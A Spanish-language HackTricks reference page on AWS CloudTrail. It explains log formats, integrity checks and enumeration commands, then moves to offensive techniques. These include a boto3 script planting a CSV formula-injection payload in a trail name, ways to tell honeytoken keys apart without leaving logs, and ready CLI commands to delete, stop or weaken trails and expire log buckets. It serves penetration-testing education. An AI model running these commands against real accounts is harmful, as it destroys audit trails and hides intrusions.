# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **registra y monitorea la actividad dentro de tu entorno AWS**. Captura **registros de eventos** detallados, incluyendo qui√©n hizo qu√©, cu√°ndo y desde d√≥nde, para todas las interacciones con los recursos de AWS. Esto proporciona un rastro de auditor√≠a de cambios y acciones, ayudando en el an√°lisis de seguridad, auditor√≠a de cumplimiento y seguimiento de cambios en los recursos. CloudTrail es esencial para entender el comportamiento de usuarios y recursos, mejorar las posturas de seguridad y asegurar el cumplimiento regulatorio.

Cada evento registrado contiene:

* El nombre de la API llamada: `eventName`
* El servicio llamado: `eventSource`
* La hora: `eventTime`
* La direcci√≥n IP: `SourceIPAddress`
* El m√©todo del agente: `userAgent`. Ejemplos:
* Signing.amazonaws.com - Desde la Consola de Administraci√≥n de AWS
* console.amazonaws.com - Usuario root de la cuenta
* lambda.amazonaws.com - AWS Lambda
* Los par√°metros de la solicitud: `requestParameters`
* Los elementos de la respuesta: `responseElements`

Los eventos se escriben en un nuevo archivo de registro **aproximadamente cada 5 minutos en un archivo JSON**, son retenidos por CloudTrail y finalmente, los archivos de registro son **entregados a S3 aproximadamente 15 minutos despu√©s**.\
Los registros de CloudTrail pueden ser **agregados a trav√©s de cuentas y regiones.**\
CloudTrail permite usar **la integridad del archivo de registro para poder verificar que tus archivos de registro no han cambiado** desde que CloudTrail te los entreg√≥. Crea un hash SHA-256 de los registros dentro de un archivo de resumen. Un hash sha-256 de los nuevos registros se crea cada hora.\
Al crear un Trail, los selectores de eventos te permitir√°n indicar el tipo de eventos a registrar: eventos de gesti√≥n, de datos o de informaci√≥n.

Los registros se guardan en un bucket de S3. Por defecto, se utiliza el cifrado del lado del servidor (SSE-S3), por lo que AWS descifrar√° el contenido para las personas que tienen acceso a √©l, pero para mayor seguridad puedes usar SSE con KMS y tus propias claves.

Los registros se almacenan en un **bucket de S3 con este formato de nombre**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Siendo el BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Ejemplo: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Dentro de cada carpeta, cada registro tendr√° un **nombre siguiendo este formato**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Convenci√≥n de Nombres de Archivos de Registro

![](<../../../../.gitbook/assets/image (122).png>)

Adem√°s, **los archivos de resumen (para verificar la integridad del archivo)** estar√°n dentro del **mismo bucket** en:

![](<../../../../.gitbook/assets/image (195).png>)

### Agregar Registros de M√∫ltiples Cuentas

* Crea un Trail en la cuenta de AWS donde deseas que se entreguen los archivos de registro.
* Aplica permisos al bucket de S3 de destino permitiendo el acceso entre cuentas para CloudTrail y permite a cada cuenta de AWS que necesite acceso.
* Crea un nuevo Trail en las otras cuentas de AWS y selecciona usar el bucket creado en el paso 1.

Sin embargo, incluso si puedes guardar todos los registros en el mismo bucket de S3, no puedes agregar registros de CloudTrail de m√∫ltiples cuentas en un CloudWatch Logs perteneciente a una sola cuenta de AWS.

{% hint style="danger" %}
Recuerda que una cuenta puede tener **diferentes Trails** de CloudTrail **habilitados** almacenando los mismos (o diferentes) registros en diferentes buckets.
{% endhint %}

### CloudTrail de todas las cuentas de la organizaci√≥n en 1

Al crear un CloudTrail, es posible indicar que se active CloudTrail para todas las cuentas en la organizaci√≥n y obtener los registros en solo 1 bucket:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

De esta manera, puedes configurar f√°cilmente CloudTrail en todas las regiones de todas las cuentas y centralizar los registros en 1 cuenta (que debes proteger).

### Verificaci√≥n de Archivos de Registro

Puedes verificar que los registros no han sido alterados ejecutando

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Registros a CloudWatch

**CloudTrail puede enviar autom√°ticamente registros a CloudWatch para que puedas establecer alertas que te adviertan cuando se realicen actividades sospechosas.**\
Ten en cuenta que para permitir que CloudTrail env√≠e los registros a CloudWatch, se necesita crear un **rol** que permita esa acci√≥n. Si es posible, se recomienda utilizar el rol predeterminado de AWS para realizar estas acciones. Este rol permitir√° a CloudTrail:

* CreateLogStream: Esto permite crear flujos de registro de CloudWatch Logs
* PutLogEvents: Entregar registros de CloudTrail al flujo de registro de CloudWatch Logs

### Historial de Eventos

El Historial de Eventos de CloudTrail te permite inspeccionar en una tabla los registros que han sido grabados:

![](<../../../../.gitbook/assets/image (89).png>)

### Perspectivas

**CloudTrail Insights** analiza autom√°ticamente los eventos de gesti√≥n de escritura de los senderos de CloudTrail y te **alerta** sobre **actividades inusuales**. Por ejemplo, si hay un aumento en los eventos de `TerminateInstance` que difiere de las l√≠neas base establecidas, lo ver√°s como un evento de Insight. Estos eventos hacen que **encontrar y responder a actividades inusuales de API sea m√°s f√°cil** que nunca.

Las perspectivas se almacenan en el mismo bucket que los registros de CloudTrail en: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Seguridad

| Integridad del Archivo de Registro de CloudTrail | <ul><li>Validar si los registros han sido manipulados (modificados o eliminados)</li><li><p>Utiliza archivos de resumen (crea un hash para cada archivo)</p><ul><li>Hashing SHA-256</li><li>SHA-256 con RSA para firma digital</li><li>clave privada propiedad de Amazon</li></ul></li><li>Toma 1 hora crear un archivo de resumen (hecho en la hora cada hora)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Detener el acceso no autorizado             | <ul><li><p>Usar pol√≠ticas de IAM y pol√≠ticas de bucket de S3</p><ul><li>equipo de seguridad ‚Äî> acceso de administrador</li><li>auditores ‚Äî> acceso solo de lectura</li></ul></li><li>Usar SSE-S3/SSE-KMS para cifrar los registros</li></ul>                                                                                                                                        |
| Prevenir que los archivos de registro sean eliminados | <ul><li>Restringir el acceso de eliminaci√≥n con pol√≠ticas de IAM y de bucket</li><li>Configurar la eliminaci√≥n MFA de S3</li><li>Validar con la Validaci√≥n de Archivos de Registro</li></ul>                                                                                                                                                                                            |

## Asesor de Acceso

AWS Access Advisor se basa en los √∫ltimos 400 d√≠as de registros de AWS **CloudTrail para recopilar sus perspectivas**. CloudTrail captura un historial de llamadas a la API de AWS y eventos relacionados realizados en una cuenta de AWS. Access Advisor utiliza estos datos para **mostrar cu√°ndo se accedi√≥ por √∫ltima vez a los servicios**. Al analizar los registros de CloudTrail, Access Advisor puede determinar qu√© servicios de AWS ha accedido un usuario o rol de IAM y cu√°ndo ocurri√≥ ese acceso. Esto ayuda a los administradores de AWS a tomar decisiones informadas sobre **refinar permisos**, ya que pueden identificar servicios que no se han accedido durante per√≠odos prolongados y potencialmente reducir permisos excesivamente amplios basados en patrones de uso reales.

{% hint style="success" %}
Por lo tanto, Access Advisor informa sobre **los permisos innecesarios que se est√°n otorgando a los usuarios** para que el administrador pueda eliminarlos.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Acciones

### Enumeraci√≥n
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Inyecci√≥n CSV**

Es posible realizar una inyecci√≥n CVS dentro de CloudTrail que ejecutar√° c√≥digo arbitrario si los registros se exportan en CSV y se abren con Excel.\
El siguiente c√≥digo generar√° una entrada de registro con un nombre de Trail incorrecto que contiene la carga √∫til:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Para m√°s informaci√≥n sobre inyecciones CSV, consulta la p√°gina:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Para m√°s informaci√≥n sobre esta t√©cnica espec√≠fica, consulta [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Evasi√≥n de Detecci√≥n**

### Evasi√≥n de HoneyTokens

Los Honeytokens se crean para **detectar la exfiltraci√≥n de informaci√≥n sensible**. En el caso de AWS, son **claves de AWS cuyo uso es monitoreado**, si algo activa una acci√≥n con esa clave, entonces alguien debe haber robado esa clave.

Sin embargo, los Honeytokens como los creados por [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) est√°n utilizando un nombre de cuenta reconocible o usando el mismo ID de cuenta de AWS para todos sus clientes. Por lo tanto, si puedes obtener el nombre de la cuenta y/o el ID de la cuenta sin hacer que Cloudtrail genere ning√∫n registro, **podr√≠as saber si la clave es un honeytoken o no**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) tiene algunas reglas para detectar si una clave pertenece a [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Si **`canarytokens.org`** aparece en el nombre del rol o el ID de cuenta **`534261010715`** aparece en el mensaje de error.
* Prob√°ndolos m√°s recientemente, est√°n usando la cuenta **`717712589309`** y a√∫n tiene la cadena **`canarytokens.com`** en el nombre.
* Si **`SpaceCrab`** aparece en el nombre del rol en el mensaje de error.
* **SpaceSiren** utiliza **uuids** para generar nombres de usuario: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Si el **nombre parece generado aleatoriamente**, hay altas probabilidades de que sea un HoneyToken.

#### Obtener el ID de cuenta del ID de clave

Puedes obtener el **ID de Cuenta** del **codificado** dentro de la **clave de acceso** como [**se explica aqu√≠**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) y verificar el ID de cuenta con tu lista de cuentas de Honeytokens de AWS:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**investigaci√≥n original**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### No generar un registro

La t√©cnica m√°s efectiva para esto es en realidad una simple. Solo usa la clave que acabas de encontrar para acceder a alg√∫n servicio dentro de tu propia cuenta de atacante. Esto har√° que **CloudTrail genere un registro dentro de TU PROPIA cuenta de AWS y no dentro de las v√≠ctimas**.

La cuesti√≥n es que la salida te mostrar√° un error que indica el ID de la cuenta y el nombre de la cuenta, por lo que **podr√°s ver si es un Honeytoken**.

#### Servicios de AWS sin registros

En el pasado, hab√≠a algunos **servicios de AWS que no env√≠an registros a CloudTrail** (encuentra una [lista aqu√≠](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Algunos de esos servicios **responder√°n** con un **error** que contiene el **ARN del rol de la clave** si alguien no autorizado (la clave honeytoken) intenta acceder a √©l.

De esta manera, un **atacante puede obtener el ARN de la clave sin activar ning√∫n registro**. En el ARN, el atacante puede ver el **ID de la cuenta de AWS y el nombre**, es f√°cil conocer el ID y los nombres de las cuentas de las empresas del HoneyToken, as√≠ que de esta manera un atacante puede identificar si el token es un HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Ten en cuenta que todas las API p√∫blicas descubiertas que no estaban creando registros de CloudTrail ahora est√°n arregladas, as√≠ que tal vez necesites encontrar las tuyas...

Para m√°s informaci√≥n, consulta la [**investigaci√≥n original**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Accediendo a Infraestructura de Terceros

Ciertos servicios de AWS **generar√°n alguna infraestructura** como **Bases de Datos** o **cl√∫steres de Kubernetes** (EKS). Un usuario **hablando directamente con esos servicios** (como la API de Kubernetes) **no usar√° la API de AWS**, por lo que CloudTrail no podr√° ver esta comunicaci√≥n.

Por lo tanto, un usuario con acceso a EKS que ha descubierto la URL de la API de EKS podr√≠a generar un token localmente y **hablar con el servicio de API directamente sin ser detectado por Cloudtrail**.

M√°s informaci√≥n en:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modificando la Configuraci√≥n de CloudTrail

#### Eliminar senderos
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Detener rastros
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Desactivar el registro en m√∫ltiples regiones

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Desactivar el registro mediante selectores de eventos

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

En el primer ejemplo, se proporciona un √∫nico selector de eventos como un array JSON con un solo objeto. El `"ReadWriteType": "ReadOnly"` indica que el **selector de eventos solo debe capturar eventos de solo lectura** (por lo que CloudTrail insights **no estar√° verificando eventos de escritura**, por ejemplo).

Puedes personalizar el selector de eventos seg√∫n tus requisitos espec√≠ficos.

#### Eliminaci√≥n de registros a trav√©s de la pol√≠tica de ciclo de vida de S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modificando la Configuraci√≥n del Bucket

* Eliminar el bucket S3
* Cambiar la pol√≠tica del bucket para denegar cualquier escritura del servicio CloudTrail
* Agregar una pol√≠tica de ciclo de vida al bucket S3 para eliminar objetos
* Deshabilitar la clave KMS utilizada para cifrar los registros de CloudTrail

### Ransomware de Cloudtrail

#### Ransomware S3

Podr√≠as **generar una clave asim√©trica** y hacer que **CloudTrail cifre los datos** con esa clave y **eliminar la clave privada** para que el contenido de CloudTrail no pueda ser recuperado.\
Esto es b√°sicamente un **ransomware S3-KMS** explicado en:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

Esta es una forma m√°s f√°cil de realizar el ataque anterior con diferentes requisitos de permisos:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referencias**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**repositorios de HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
